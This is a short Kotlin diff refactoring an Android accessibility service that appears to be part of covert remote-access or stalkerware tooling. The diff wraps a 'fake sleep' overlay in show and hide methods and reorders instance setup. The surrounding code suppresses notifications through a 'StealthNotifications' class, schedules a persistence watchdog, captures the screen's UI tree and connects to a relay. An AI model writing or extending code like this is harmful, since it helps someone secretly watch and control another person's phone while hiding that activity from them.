@@ -31,8 +31,15 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     private var lastAuthRepairAt = 0L
 
     @Volatile var lastTreeJson: org.json.JSONObject? = null
-    lateinit var fakeSleepOverlay: FakeSleepOverlay
-        private set
+    private lateinit var fakeSleepOverlay: FakeSleepOverlay
+
+    fun showFakeSleepOverlay() {
+        if (::fakeSleepOverlay.isInitialized) fakeSleepOverlay.show()
+    }
+
+    fun hideFakeSleepOverlay() {
+        if (::fakeSleepOverlay.isInitialized) fakeSleepOverlay.hide()
+    }
 
     private val treeLoop = object : Runnable {
         override fun run() {
@@ -54,7 +61,6 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        instance = this
         InputHandler.service = this
         StealthNotifications.suppressAll(this)
         PersistenceWatchdog.schedule(this)
@@ -64,7 +70,8 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         registerNetworkWatcher()
         UserSession.setAccessibilityWasEnabled(this, true)
         fakeSleepOverlay = FakeSleepOverlay(this)
-        if (FakeSleepMode.isEnabled(this)) fakeSleepOverlay.show()
+        instance = this
+        if (FakeSleepMode.isEnabled(this)) showFakeSleepOverlay()
         ProximityGuard.onServiceReady(this)
         runCatching { ensureRelay() }
     }
